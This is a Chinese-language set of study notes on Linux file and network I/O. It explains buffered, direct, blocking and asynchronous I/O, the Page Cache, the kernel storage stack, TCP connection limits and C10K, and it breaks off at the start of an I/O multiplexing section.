<h1>文件I/O（缓冲与非缓冲 I/O、直接与非直接 I/O、阻塞与非阻塞 I/O、 同步与异步 I/O）</h1>
<p>IO 多路复用（IO multiplexing）指的是：</p>
<blockquote>
<p><strong>一个线程就能同时监听多个 IO 事件</strong>**（如多个 socket 是否有数据可读/可写）<strong>，从而在</strong>不创建多个线程的情况下实现高并发处理**。</p>
</blockquote>
<h3 id="🧠-本质理解">🧠 本质理解</h3>
<p>传统做法：</p>
<ul>
<li>每个 socket（网络连接）都要一个线程去处理。</li>
<li>如果有 1 万个客户端，就要开 1 万个线程，太重了。</li>
</ul>
<p>IO 多路复用：</p>
<ul>
<li>只用一个线程，使用 <code>select</code> / <code>poll</code> / <code>epoll</code> 监听多个 socket。</li>
<li>哪个 socket 有数据，就去处理哪个，大大节省资源。</li>
</ul>
<h3 id="📦-生活类比">📦 生活类比</h3>
<p><strong>餐厅排队取餐</strong></p>
<ul>
<li><strong>传统做法（阻塞 IO）：</strong> 100个人排队，每个人都站在窗口等自己的餐做好，堵得慌。</li>
<li><strong>IO 多路复用：</strong> 你拿了个取餐号（socket），系统广播：“88号好了！”（事件来了） 你这时再过去取餐（读取数据）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjQ5N2MzYjZjYzQ1NWQ4MzA1ZDM1MTkyNmRkNDIzOTFfVkgydzJ0dlJIT1lJOVU1QkJsaWFZWGVvNTJnTzI3TVNfVG9rZW46T25GMGJVVEtQb3FMMUl4UjhMbWN2M1VvbkFiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="1、缓冲-vs-非缓冲-I-O">1、缓冲 vs 非缓冲 I/O</h2>
<h3 id="📦-缓冲-I-O（Buffered-I-O）">📦 缓冲 I/O（Buffered I/O）</h3>
<ul>
<li><strong>常见函数</strong>：<code>fopen</code>, <code>fread</code>, <code>fprintf</code>（C语言标准库）</li>
<li><strong>特点</strong>：数据<strong>先写入用户空间缓冲区</strong>，再通过系统调用一次性写入内核空间</li>
<li>数据流动过程：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[用户态缓存]</span> ←→ <span class="selector-attr">[内核态缓存（页缓存）]</span> ←→ <span class="selector-attr">[磁盘]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>数据先读入/写出到用户态缓冲区，积累一定量后统一读写，提高效率，减少系统调用次数。</p>
</blockquote>
<ul>
<li><strong>适合场景</strong>：频繁的小文件读写操作，减少系统调用次数提高性能</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">FILE</span> *fp = fopen(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);<span class="string">` `</span>fprintf(fp, <span class="string">&quot;hello world&quot;</span>);  <span class="regexp">//</span> 写入用户缓冲区<span class="string">` `</span>fclose(fp);                  <span class="regexp">//</span> 刷新到磁盘</span><br></pre></td></tr></table></figure>
<h3 id="🧊-非缓冲-I-O（Unbuffered-I-O）">🧊 非缓冲 I/O（Unbuffered I/O）</h3>
<ul>
<li><strong>常见函数</strong>：<code>open</code>, <code>read</code>, <code>write</code>（系统调用）</li>
<li><strong>特点</strong>：<strong>直接写入内核缓冲区</strong>，不经过用户空间缓冲区</li>
<li>数据流动过程：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[用户空间]</span> ←→ <span class="selector-attr">[内核空间（页缓存）]</span> ←→ <span class="selector-attr">[磁盘]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>直接与内核交互，用户每次调用 <code>read()</code> 都会陷入内核态获取数据，没有中间缓存机制。</p>
</blockquote>
<ul>
<li><strong>适合场景</strong>：对性能或实时性要求高的场景</li>
</ul>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = <span class="keyword">open</span>(<span class="string">&quot;test.txt&quot;</span>, O_WRONLY); <span class="string">``</span><span class="keyword">write</span>(fd, <span class="string">&quot;hello&quot;</span>, <span class="number">5</span>);  <span class="regexp">//</span> 直接写入内核缓存</span><br></pre></td></tr></table></figure>
<h2 id="2、直接-vs-非直接-I-O（O-DIRECT）">2、直接 vs 非直接 I/O（O_DIRECT）</h2>
<p>根据「是否利用操作系统的缓存」，可以把文件 I/O 分为直接 I/O 与非直接 I/O</p>
<h3 id="💨-非直接-I-O（默认）">💨 非直接 I/O（默认）</h3>
<ul>
<li>默认所有 I/O 都是通过 <strong>内核页缓存</strong>**（page cache）**</li>
<li>应用程序 → 内核缓冲 → 磁盘</li>
<li>数据流动过程：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[用户态 buffer]</span> ⇅ 拷贝 ⇅ <span class="selector-attr">[内核态 buffer]</span> ←→ <span class="selector-attr">[磁盘]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>读操作时，数据从内核缓存中拷贝给用户程序；写操作时，数据从用户程序拷贝给内核缓存，再由内核决定什么时候写入数据到磁盘。</p>
</blockquote>
<ul>
<li><strong>优点</strong>：提高磁盘访问效率（读写命中缓存）</li>
</ul>
<h3 id="🚀-直接-I-O（Direct-I-O）">🚀 直接 I/O（Direct I/O）</h3>
<ul>
<li>通过 <code>open(filename, O_DIRECT)</code> 开启</li>
<li>绕过内核缓存，<strong>用户缓冲区和磁盘直接交互</strong></li>
<li>数据流动过程：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[用户空间 DirectBuffer]</span> ←→ <span class="selector-attr">[磁盘]</span> （绕过内核缓存）</span><br></pre></td></tr></table></figure>
<ul>
<li>要求：缓冲区地址和大小必须<strong>对齐到磁盘扇区</strong></li>
</ul>
<p><strong>适合场景</strong>：数据库、日志系统等对缓存控制要求严格的场景。</p>
<p>我个人的理解是：缓冲io是在用户态、内核态都建立缓冲区，非直接io是在内核态建立缓冲区</p>
<h2 id="3、阻塞-I-O-vs-非阻塞-I-O">3、阻塞 I/O vs 非阻塞 I/O</h2>
<h3 id="✅-阻塞-I-O（默认的-read-accept-recv-等）">✅ 阻塞 I/O（默认的 <code>read()</code> / <code>accept()</code> / <code>recv()</code> 等）</h3>
<h4 id="数据流动过程：">数据流动过程：</h4>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[调用<span class="keyword">read</span>()] → 阻塞 → 等内核准备好数据 → 拷贝到用户空间 <span class="keyword">buffer</span></span><br></pre></td></tr></table></figure>
<ul>
<li>一旦调用 <code>read()</code>，当前线程会一直等，直到有数据为止。</li>
</ul>
<blockquote>
<p>阻塞等待的是「内核数据准备好」和「数据从内核态拷贝到用户态」这两个过程</p>
</blockquote>
<h3 id="✅-非阻塞-I-O（设置-O-NONBLOCK-或使用-Java-NIO）">✅ 非阻塞 I/O（设置 <code>O_NONBLOCK</code> 或使用 Java NIO）</h3>
<h4 id="数据流动过程：-2">数据流动过程：</h4>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[调用read()]</span> → 立即返回 → 若无数据则返回 EAGAIN → 稍后再试</span><br></pre></td></tr></table></figure>
<ul>
<li>可用于多路复用（<code>select</code> / <code>poll</code> / <code>epoll</code> / Java <code>Selector</code>）</li>
</ul>
<p>实际上，无论是阻塞 I/O、非阻塞 I/O，还是基于非阻塞 I/O 的多路复用都是同步调用。因为它们在 read 调用时，内核将数据从内核空间拷贝到应用程序空间，过程都是需要等待的，也就是说这个过程是同步的，如果内核实现的拷贝效率不高，read 调用就会在这个同步过程中等待比较长的时间。</p>
<p>而真正的异步 I/O 是「内核数据准备好」和「数据从内核态拷贝到用户态」这两个过程都不用等待</p>
<h2 id="4、同步-I-O-vs-异步-I-O">4、同步 I/O vs 异步 I/O</h2>
<h3 id="✅-同步-I-O">✅ 同步 I/O</h3>
<p>指<strong>用户态需要等内核完成数据搬运</strong>才算完成。</p>
<h4 id="数据流动过程：-3">数据流动过程：</h4>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户发起 <span class="built_in">read</span>() → 阻塞 → 内核读取数据 → 拷贝到用户空间 → 返回</span><br></pre></td></tr></table></figure>
<h3 id="✅-异步-I-O（如-aio-read-、Java-NIO-2-的-AsynchronousFileChannel）">✅ 异步 I/O（如 <code>aio_read()</code>、Java NIO.2 的 <code>AsynchronousFileChannel</code>）</h3>
<h4 id="数据流动过程：-4">数据流动过程：</h4>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户发起 <span class="built_in">aio_read</span>() → 立即返回 → 内核后台读取数据 → 拷贝好后回调通知</span><br></pre></td></tr></table></figure>
<ul>
<li>用户线程发起操作后可做别的事，完成时由内核通知（信号/回调/事件）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjQyNjMxNDMwNzQ2NTdlNWIzMmFlMGExOTQ1MmVjMDRfVm1KdFM3cmVKdzQ0dTFlbXBwellXMDNZR3ZWMTM5QUxfVG9rZW46VnpyOGIxNVlnb3NyZHp4V0N5ZWNoWXU0bmRkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧠-你问的是：">🧠 你问的是：</h2>
<blockquote>
<p><strong>同步 I/O 和 阻塞 I/O 有什么区别？</strong> 它们都看起来像“等 I/O 完成再继续”，为啥非要分两个概念？</p>
</blockquote>
<h2 id="✅-核心区别一句话总结：">✅ 核心区别一句话总结：</h2>
<blockquote>
<p><strong>“同步 I/O”强调的是</strong>：你发出的 <strong>I/O 请求，程序必须自己等结果</strong>， <strong>“阻塞 I/O”强调的是</strong>：<strong>操作系统让你等的时候，是不是把你挂起了（不能干别的）</strong></p>
</blockquote>
<p>🚫 “阻塞 I/O”：你啥也不能干，只能等系统做完</p>
<p>🕒 “同步 I/O”：你虽然自由，但得等数据来了你才能继续干正事</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2I2OTU4OTM5MzFhODgzOGI5OWU2NzAzYzIxNjk2MGRfUXhhNTd2OXZ0ejJlbHM3cmVQTm94ODNkbkVGVUZCRGxfVG9rZW46S2VXdWJ1bFlSb0FMSG94Z2J2WmNIWjR5bjBlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>PageCache</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE1ZTdmODg2MGU4Yzk0OTkxNjFhNjAyYjlmODI4NTRfWHJxY1NJRjBUazZ1bGRkdWFTbjl6dzk3Z2l6bDVuMDNfVG9rZW46SHJUTWJxYm9Ub29PVnB4UTBiTmNDQkdDbjBkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="✅-1-用户态程序的-I-O-并不直接写磁盘">✅ 1. 用户态程序的 I/O 并不直接写磁盘</h3>
<p>从图中你看到，应用程序（用户态）调用 <code>write()</code> 系统调用后，其实只是：</p>
<ul>
<li>数据写入了内核的 <strong>页缓存（Page Cache）</strong> 👉 也就是内核缓冲，还没写到硬盘！</li>
</ul>
<h3 id="✅-2-默认是「Buffered-I-O」——-先进-Page-Cache，再写磁盘">✅ 2. 默认是「Buffered I/O」—— 先进 Page Cache，再写磁盘</h3>
<p>流程是这样：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">App 进程（用户态）</span><br><span class="line">   ↓ write()` `   ↓ ``内核 VFS` `   ↓` `Page Cache （内核缓冲区） ``   ↓` `Block I/O Layer（调度） ``   ↓ ``驱动 Device Driver` `   ↓ ``磁盘</span><br></pre></td></tr></table></figure>
<p>🧠 所以：<code>write()</code> 返回不等于数据写入磁盘！</p>
<p>除非你：</p>
<ul>
<li>调用 <code>fsync()</code> / <code>flush()</code> / <code>close()</code> 强制同步；</li>
<li>或系统空闲自动将 Page Cache 刷入磁盘。</li>
</ul>
<h3 id="✅-3-如果你使用了「Direct-I-O（O-DIRECT）」">✅ 3. 如果你使用了「Direct I/O（O_DIRECT）」</h3>
<p>就<strong>跳过 Page Cache</strong>，直接写入磁盘：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">int fd</span> = open(<span class="string">&quot;file.txt&quot;</span>, O_WRONLY | O_DIRECT);</span><br></pre></td></tr></table></figure>
<p>🔁 数据路径：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">App` ` ↓` `VFS` ` ↓（绕过 Page Cache）` `Block I/O Layer` ` ↓ ``磁盘</span><br></pre></td></tr></table></figure>
<p>这样就能确保写操作绕过缓存 —— 更适合数据库或文件系统底层等<strong>对一致性和性能要求高的场景</strong>。</p>
<h3 id="✅-4-内存映射-I-O（mmap）">✅ 4. 内存映射 I/O（<code>mmap</code>）</h3>
<p>这是 <code>Memory-Mapped I/O</code>，直接将文件映射成一段内存空间：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">char</span> *<span class="class"><span class="keyword">data</span> = mmap(...);</span></span><br></pre></td></tr></table></figure>
<ul>
<li>读写就像内存操作一样，效率高；</li>
<li>背后依然依赖 Page Cache 管理数据；</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU4MzhjM2Q5YmQ2N2U4YTIxMDgzNDIyYjk4ZGQwYTdfMm0wTHNUWFc3MHNhTnlCQjhJa1l6NzlWZWlxZEZrcTJfVG9rZW46TnEwSmJjNEI0b0pFb2h4Sk1iYWNPcGxqbmRYXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="情况一：没有缓冲（如直接使用-FileOutputStream）"><strong>情况一：没有缓冲</strong>（如直接使用 <code>FileOutputStream</code>）</h3>
<p>写到哪，系统就立刻写磁盘 —— 🟢 <strong>进程崩溃前写入的部分是有数据的</strong>（<strong>因为已经写入磁盘了</strong>）</p>
<h3 id="情况二：用了缓冲（比如-BufferedWriter、BufferedOutputStream-）"><strong>情况二：用了缓冲（比如</strong> <strong><code>BufferedWriter</code><strong><strong>、</strong></strong><code>BufferedOutputStream</code>****）</strong></h3>
<p>默认缓冲区<strong>先写内存、再刷盘</strong>：</p>
<ul>
<li>如果数据<strong>还在用户态缓冲区</strong>，还没 <code>flush()</code>，进程崩了，就<strong>丢了！</strong></li>
<li>如果<strong>缓冲区已满</strong>，被动 <code>flush()</code> 过一部分，那部分<strong>已经写入磁盘，有数据</strong></li>
<li>✅ 所以写了一半挂了，文件里<strong>有可能部分有数据、有可能没有，全看 flush 时机</strong></li>
</ul>
<h2 id="✅-什么是-page-与-Page-Cache？">✅ 什么是 page 与 Page Cache？</h2>
<ul>
<li><strong>Page（页）</strong> 是 Linux 内存管理的基本单位，通常大小为 4KB。</li>
<li><strong>Page Cache</strong> 是内核用于缓存文件内容的机制，是由多个 page 组成的缓存区域。</li>
</ul>
<h2 id="✅-并不是所有的-page-都属于-Page-Cache">✅ 并不是所有的 page 都属于 Page Cache</h2>
<p>Linux 中将内存 page 分成两类：</p>
<h2 id="✅-为什么叫-Page-Cache-而不是-Block-Cache？">✅ 为什么叫 Page Cache 而不是 Block Cache？</h2>
<p>这是因为：</p>
<ul>
<li>Linux 不只缓存 <strong>磁盘块数据</strong>，还缓存 <strong>文件系统结构和元信息</strong>，例如目录项、inode。</li>
<li>而且不仅缓存在 Page Cache，还有 Buffer Cache（更偏元数据）。</li>
</ul>
<p>所以叫 <strong>Page Cache</strong> 更能反映真实缓存内容。</p>
<h2 id="✅-什么时候不会进入-Page-Cache？">✅ 什么时候不会进入 Page Cache？</h2>
<ul>
<li>当你用 <code>O_DIRECT</code> 打开文件（即 Direct I/O），就是跳过 Page Cache，直接读写磁盘。</li>
<li>这适用于数据库或日志等对一致性要求极高的场景。</li>
</ul>
<h2 id="✅-举个类比方便理解：">✅ 举个类比方便理解：</h2>
<ul>
<li>Page Cache 像你浏览器缓存的网页，有源文件在磁盘，删了也能重新下载。</li>
<li>Anonymous page 像你正在写的草稿纸，没保存就关了就全没了，所以系统要先给你拍照（swap 到磁盘）再清内存</li>
</ul>
<h2 id="✅-File-backed-page-vs-Anonymous-page-的-swap-行为对比">✅ File-backed page vs Anonymous page 的 swap 行为对比</h2>
<table>
<thead>
<tr>
<th>对比点</th>
<th>File-backed page（Page Cache）</th>
<th>Anonymous page</th>
</tr>
</thead>
<tbody>
<tr>
<td>是否能丢</td>
<td>能（可从磁盘重新读取）</td>
<td>不能（必须 swap 到磁盘）</td>
</tr>
<tr>
<td>回收时处理</td>
<td>如果没修改，直接丢弃</td>
<td>必须写入 swap 空间</td>
</tr>
<tr>
<td>swap 性能</td>
<td>高，因为可顺序读取</td>
<td>低，因写入随机且非结构化</td>
</tr>
</tbody>
</table>
<h1>linux存储堆栈（设备管理）</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY4MmJiMDFkMGVjOGE5MWMzYjJlOGZhYWNmYzc3OTlfVk5DYjhVaXNFem5qM0JsV045bjZ4N2kydG9BSkwyWTFfVG9rZW46VTNOVGJqY1lLb1pPTkF4MUJuamNBSVZJbnJWXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>Linux存储堆栈：</h1>
<ol>
<li>
<h2 id="用户空间"><strong>用户空间</strong></h2>
</li>
</ol>
<h4 id="用户程序"><strong>用户程序</strong></h4>
<ul>
<li><strong>作用</strong>：用户程序通过系统调用（如 <code>open()</code>, <code>read()</code>, <code>write()</code>）与文件系统交互。</li>
<li><strong>示例</strong>：当用户程序执行 <code>read(&quot;file.txt&quot;)</code> 时，请求会通过系统调用接口传递到内核空间。</li>
</ul>
<h4 id="文件系统接口"><strong>文件系统接口</strong></h4>
<ul>
<li><strong>作用</strong>：提供标准化的系统调用接口（如POSIX API），屏蔽底层实现细节，使用户程序无需关心具体文件系统或硬件差异。</li>
</ul>
<ol>
<li>
<h2 id="内核空间"><strong>内核空间</strong></h2>
</li>
</ol>
<h4 id="虚拟文件系统（VFS）"><strong>虚拟文件系统（VFS）</strong></h4>
<ul>
<li><strong>作用</strong>：抽象不同文件系统的具体实现（如ext4、NFS），提供统一的接口（如 <code>inode</code>、<code>dentry</code> 操作）。</li>
<li><strong>关键结构</strong>：<code>struct file_operations</code> 定义文件操作函数指针，由具体文件系统实现。</li>
<li><strong>示例</strong>：ext4和NFS分别实现自己的 <code>read()</code> 逻辑，但通过VFS统一暴露给上层。</li>
</ul>
<h4 id="具体文件系统（ext4、NFS）"><strong>具体文件系统（ext4、NFS）</strong></h4>
<ul>
<li><strong>作用</strong>：处理文件元数据和数据的存储逻辑。
<ul>
<li><strong>ext4</strong>：本地磁盘文件系统，管理磁盘块分配、日志等。</li>
<li><strong>NFS</strong>：网络文件系统，通过RPC协议与远程服务器通信。</li>
</ul>
</li>
</ul>
<h4 id="页缓存（Page-Cache）"><strong>页缓存（Page Cache）</strong></h4>
<ul>
<li><strong>作用</strong>：缓存文件数据（以内存页为单位），减少直接访问磁盘的次数。</li>
<li><strong>机制</strong>：采用LRU算法管理缓存，支持预读（Read-Ahead）优化顺序读性能。</li>
<li><strong>与缓冲区缓存的区别</strong>：页缓存以文件为单位，缓冲区缓存以磁盘块为单位（现已被页缓存整合）。</li>
</ul>
<h4 id="通用块层（Generic-Block-Layer）"><strong>通用块层（Generic Block Layer）</strong></h4>
<ul>
<li><strong>作用</strong>：
<ul>
<li>将文件系统的逻辑块请求转化为物理块请求。</li>
<li>合并相邻I/O请求（Merge），提升效率。</li>
<li>提供块设备抽象，支持多种存储介质（如SSD、HDD）。</li>
</ul>
</li>
</ul>
<h4 id="I-O调度层（I-O-Scheduler）"><strong>I/O调度层（I/O Scheduler）</strong></h4>
<ul>
<li><strong>作用</strong>：优化I/O请求顺序，减少磁盘寻道时间。</li>
<li><strong>常见调度算法</strong>：
<ul>
<li><strong>CFQ（Completely Fair Queuing）</strong>：为每个进程分配公平的I/O带宽。</li>
<li><strong>Deadline</strong>：确保请求在截止时间内完成，避免饥饿。</li>
<li><strong>NOOP</strong>：简单FIFO队列，适用于SSD（无需寻道优化）。</li>
</ul>
</li>
</ul>
<h4 id="块设备驱动程序"><strong>块设备驱动程序</strong></h4>
<ul>
<li><strong>作用</strong>：直接控制块设备硬件（如SATA、NVMe控制器），执行底层读写操作。</li>
<li><strong>示例</strong>：NVMe驱动通过PCIe总线与SSD通信，发送读写命令。</li>
</ul>
<ol>
<li>
<h2 id="物理硬件层"><strong>物理硬件层</strong></h2>
</li>
</ol>
<h4 id="块设备中断控制器"><strong>块设备中断控制器</strong></h4>
<ul>
<li><strong>作用</strong>：处理硬件中断，通知CPU I/O操作完成。</li>
<li><strong>示例</strong>：磁盘完成数据读取后触发中断，驱动程序处理中断并唤醒等待的进程。</li>
</ul>
<h4 id="块设备控制器"><strong>块设备控制器</strong></h4>
<ul>
<li><strong>作用</strong>：管理物理设备的操作，如磁盘旋转、磁头移动（HDD）或闪存芯片读写（SSD）。</li>
<li><strong>示例</strong>：SATA控制器将逻辑块地址（LBA）转换为物理磁道、扇区。</li>
</ul>
<h4 id="磁盘设备"><strong>磁盘设备</strong></h4>
<ul>
<li><strong>作用</strong>：最终存储数据的物理介质，如HDD、SSD或NVMe盘。</li>
</ul>
<h3 id="数据流动示例：读取文件"><strong>数据流动示例：读取文件</strong></h3>
<ol>
<li><strong>用户程序</strong>调用 <code>read()</code>，触发系统调用。</li>
<li><strong>VFS</strong> 根据文件类型调用ext4的 <code>read()</code> 方法。</li>
<li><strong>页缓存</strong> 检查数据是否已缓存：
<ol>
<li>命中：直接返回数据。</li>
<li>未命中：发起磁盘I/O请求。</li>
</ol>
</li>
<li><strong>通用块层</strong> 将逻辑块请求转换为物理块请求，合并相邻请求。</li>
<li><strong>I/O调度层</strong> 对请求排序（如按LBA升序排列）。</li>
<li><strong>块设备驱动</strong> 发送指令到磁盘控制器。</li>
<li><strong>磁盘设备</strong> 读取数据，通过中断通知驱动完成。</li>
<li>数据逐层返回，最终写入页缓存并拷贝到用户空间。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE4ZDUwYjJkOGY0ODIxNzE4NzVlMDUyZDQ5YTM4YzFfeGRwVUpBS1RMaGQ1dlhudG5qcE4zTTlnczdHVGVhUFpfVG9rZW46TDk5WWJCYkUyb3VJaXh4YTNxQmNZWXFnbm9mXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>如何服务更多用户（网络系统）</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2ZmNTVkMWZjZDQyYTQyYTlhZmY0MGUwZjYyOWQ3ZTZfcm1kdUdGb0pRbGx0bHBRZ0ZOdXlIMXV5YUdqU3hZenhfVG9rZW46WkZkVGI4R3p1b3BSM1R4clNPeWN5RWJablVkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="一、前言：为什么要讨论-TCP-网络-I-O-模型？">一、前言：为什么要讨论 TCP 网络 I/O 模型？</h3>
<p>文中开头提到：</p>
<blockquote>
<p>TCP Socket 调用流程是最简单、最基本的，它基本只能一对一通信，因为使用的是同步阻塞方式。</p>
</blockquote>
<p>也就是说，传统的 TCP Socket 使用的是<strong>阻塞 I/O</strong>，一旦服务端还在处理一个客户端的数据读写操作，其他客户端就只能等待。这种一对一的处理模式，明显<strong>浪费资源，限制并发能力</strong>，所以我们需要引入更先进的网络 I/O 模型（如非阻塞 I/O、异步 I/O）来提高服务端的吞吐能力。</p>
<h3 id="二、服务端到底能同时支持多少个-TCP-连接？">二、服务端到底能同时支持多少个 TCP 连接？</h3>
<p>作者提了个问题：“你知道服务器单机能处理最多的 TCP 连接是多少个吗？”</p>
<p>这其实是很多人关心的重点。文中指出：</p>
<blockquote>
<p>TCP 连接是由四元组唯一确认的：<strong>本机 IP、本机端口、对端 IP、对端端口</strong>。</p>
</blockquote>
<p>这个四元组的含义是：一个 TCP 连接必须由“我是谁（IP+端口）” 和 “对方是谁（IP+端口）” 共同确定。</p>
<h4 id="结论：最大-TCP-连接数-客户端-IP-数-×-客户端端口数">结论：最大 TCP 连接数 = 客户端 IP 数 × 客户端端口数</h4>
<p>对于 IPv4：</p>
<ul>
<li>客户端 IP 数最多为 2³²（40多亿）</li>
<li>客户端端口数最多为 2¹⁶（65536），但通常不能用满</li>
</ul>
<p>所以，<strong>理论上最大 TCP 连接数 ≈ 2³² × 2¹⁶ ≈ 2⁴⁸（千万亿级别）</strong></p>
<p>但这是理论值，实际做不到这么多，为什么？</p>
<h3 id="三、限制实际-TCP-连接数量的两个因素：">三、限制实际 TCP 连接数量的两个因素：</h3>
<h4 id="1-文件描述符（File-Descriptor）限制：">1. <strong>文件描述符（File Descriptor）限制</strong>：</h4>
<p>在 Linux 中，Socket 连接本质上是一个文件，所以每个连接都会占用一个文件描述符。Linux 下：</p>
<ul>
<li>一个进程打开的文件描述符默认最大值为 1024（可通过 <code>ulimit</code> 命令修改）</li>
<li>也就是说，如果不修改这个上限，<strong>服务器最多只能同时维持 1024 个连接</strong></li>
</ul>
<h4 id="2-内存限制：">2. <strong>内存限制</strong>：</h4>
<p>每一个 TCP 连接都要占用内核数据结构、缓存等系统内存。比如：</p>
<ul>
<li>如果服务器内存是 2GB，每个连接平均占用 200KB</li>
<li>那么最多只能支持约 10,000 个连接（2GB ÷ 200KB ≈ 1 万）</li>
</ul>
<h3 id="四、什么是-C10K-问题？">四、什么是 C10K 问题？</h3>
<blockquote>
<p>C10K 是指单台服务器如何同时处理 <strong>1 万个客户端连接</strong> 的问题。</p>
</blockquote>
<p>早期的服务模型难以达到这个规模，主要受限于上述的文件描述符和内存瓶颈。</p>
<p>但现在这个问题被越来越多现代网络模型解决了，比如：</p>
<ul>
<li>使用 <strong>非阻塞 I/O（NIO）</strong></li>
<li>使用 <strong>IO 多路复用（如 epoll）</strong></li>
<li>使用 <strong>异步 I/O、协程等机制</strong></li>
</ul>
<p>这些优化方案可以<strong>大幅提升单机并发处理能力</strong>，有的甚至可以支持 C100K（10 万连接）或者百万级连接。</p>
<h3 id="总结一句话：">总结一句话：</h3>
<blockquote>
<p>理论上 TCP 连接数几乎无限，但受限于系统资源（文件描述符 &amp; 内存）和 I/O 模型，实际服务器能支撑的连接数远低于理论值，<strong>解决这些限制就是 C10K 问题的核心。</strong></p>
</blockquote>
<h1>IO多路复用：select/poll/epoll</h1>
<h2 id="多进程模型">多进程模型</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjkzMGI4NjBiMDExNjQ5NzY2ZTAxMTcxNTZmMjJlN2JfYmNYbGZnWWJoV2RXS1NUQVBKR3ZZUGtpTkZ1TTZ5c1FfVG9rZW46RUhmTmJIZU5Gb2wzb014RlRRMGN3OVd5bjh1XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODEyMDRiMDA0ZGYyZWUxZjYyY2RlZjU2N2Y5M2M2NjZfNUdxUHpITWhYc0FKZ2RJaEZIbFpGQXJsdHRTcHpFbmNfVG9rZW46TFBDTGJVOWUxb1VmZHd4U2tFY2NkQldqblVkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔧-一、什么是多进程模型？">🔧 一、什么是多进程模型？</h2>
